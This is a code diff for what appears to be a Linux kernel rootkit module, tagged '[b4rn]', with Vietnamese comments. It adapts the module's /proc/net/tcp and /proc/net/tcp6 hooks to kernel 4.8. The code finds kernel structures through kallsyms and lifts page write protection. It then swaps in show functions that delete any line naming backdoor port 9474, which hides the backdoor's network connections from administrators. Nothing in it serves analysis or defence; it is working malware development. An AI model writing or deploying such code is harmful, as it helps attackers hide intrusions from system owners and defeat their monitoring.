@@ -102,6 +102,7 @@ struct linux_dirent64 {
 static inline void
 tlb_flush_hard(void)
 {
+    write_cr3(virt_to_phys(current->mm->pgd));
     __flush_tlb_all();
 }
 
@@ -377,7 +378,11 @@ hook_pid_maps_seq_show(const char *path)
 
 
 /* =================================================================
- * PHẦN 6.5: HOOK /proc/net/tcp — ẨN KẾT NỐI MẠNG (SỬ DỤNG KALLSYMS)
+ * PHẦN 6.5: HOOK /proc/net/tcp — ẨN KẾT NỐI MẠNG
+ *
+ * Kernel 4.8 không export "tcp4_seq_ops" trực tiếp.
+ * Thay vào đó dùng "tcp4_seq_afinfo" (struct tcp_seq_afinfo),
+ * lấy con trỏ seq_ops từ trong đó rồi hook .show.
  * ================================================================= */
 
 static struct seq_operations *tcp4_seq_ops_ptr = NULL;
@@ -391,14 +396,14 @@ static int new_tcp4_seq_show(struct seq_file *seq, void *v)
     int ret, prev_len, this_len;
     char port_hex[16];
 
-    /* Port 9474 in hex is 2502. The format in /proc/net/tcp is IP:PORT */
+    /* Port 9474 = 0x2502. /proc/net/tcp hiển thị dạng IP:PORT hex */
     snprintf(port_hex, sizeof(port_hex), ":%04X", BACKDOOR_PORT);
 
     prev_len = seq->count;
     ret      = old_tcp4_seq_show(seq, v);
     this_len = seq->count - prev_len;
 
-    if (strnstr(seq->buf + prev_len, port_hex, this_len)) {
+    if (this_len > 0 && strnstr(seq->buf + prev_len, port_hex, this_len)) {
         seq->count -= this_len; /* Xóa dòng này khỏi output */
     }
     return ret;
@@ -415,7 +420,7 @@ static int new_tcp6_seq_show(struct seq_file *seq, void *v)
     ret      = old_tcp6_seq_show(seq, v);
     this_len = seq->count - prev_len;
 
-    if (strnstr(seq->buf + prev_len, port_hex, this_len)) {
+    if (this_len > 0 && strnstr(seq->buf + prev_len, port_hex, this_len)) {
         seq->count -= this_len; /* Xóa dòng này khỏi output */
     }
     return ret;
@@ -423,29 +428,42 @@ static int new_tcp6_seq_show(struct seq_file *seq, void *v)
 
 static int init_proc_net_tcp_hook(void)
 {
-    tcp4_seq_ops_ptr = (struct seq_operations *)kallsyms_lookup_name("tcp4_seq_ops");
-    if (tcp4_seq_ops_ptr) {
+    struct tcp_seq_afinfo *afinfo4, *afinfo6;
+
+    /*
+     * Kernel 4.8: symbol là "tcp4_seq_afinfo" (struct tcp_seq_afinfo),
+     * bên trong có trường seq_ops (struct seq_operations).
+     * Ta lấy &afinfo->seq_ops để hook .show.
+     */
+    afinfo4 = (struct tcp_seq_afinfo *)kallsyms_lookup_name("tcp4_seq_afinfo");
+    if (afinfo4) {
+        tcp4_seq_ops_ptr  = &afinfo4->seq_ops;
         old_tcp4_seq_show = tcp4_seq_ops_ptr->show;
         unprotect_page((unsigned long)tcp4_seq_ops_ptr);
         tcp4_seq_ops_ptr->show = new_tcp4_seq_show;
         protect_page((unsigned long)tcp4_seq_ops_ptr);
-        printk(KERN_INFO "[b4rn] Hooked tcp4_seq_ops (/proc/net/tcp)\n");
+        printk(KERN_INFO "[b4rn] Hooked tcp4_seq_afinfo->seq_ops (/proc/net/tcp)\n");
+    } else {
+        printk(KERN_WARNING "[b4rn] tcp4_seq_afinfo not found\n");
     }
 
-    tcp6_seq_ops_ptr = (struct seq_operations *)kallsyms_lookup_name("tcp6_seq_ops");
-    if (tcp6_seq_ops_ptr) {
+    afinfo6 = (struct tcp_seq_afinfo *)kallsyms_lookup_name("tcp6_seq_afinfo");
+    if (afinfo6) {
+        tcp6_seq_ops_ptr  = &afinfo6->seq_ops;
         old_tcp6_seq_show = tcp6_seq_ops_ptr->show;
         unprotect_page((unsigned long)tcp6_seq_ops_ptr);
         tcp6_seq_ops_ptr->show = new_tcp6_seq_show;
         protect_page((unsigned long)tcp6_seq_ops_ptr);
-        printk(KERN_INFO "[b4rn] Hooked tcp6_seq_ops (/proc/net/tcp6)\n");
+        printk(KERN_INFO "[b4rn] Hooked tcp6_seq_afinfo->seq_ops (/proc/net/tcp6)\n");
+    } else {
+        printk(KERN_WARNING "[b4rn] tcp6_seq_afinfo not found\n");
     }
 
     if (!tcp4_seq_ops_ptr && !tcp6_seq_ops_ptr) {
-        printk(KERN_ERR "[b4rn] Could not find tcp4_seq_ops or tcp6_seq_ops\n");
+        printk(KERN_ERR "[b4rn] Could not find tcp4_seq_afinfo or tcp6_seq_afinfo\n");
         return -1;
     }
-    
+
     return 0;
 }
 
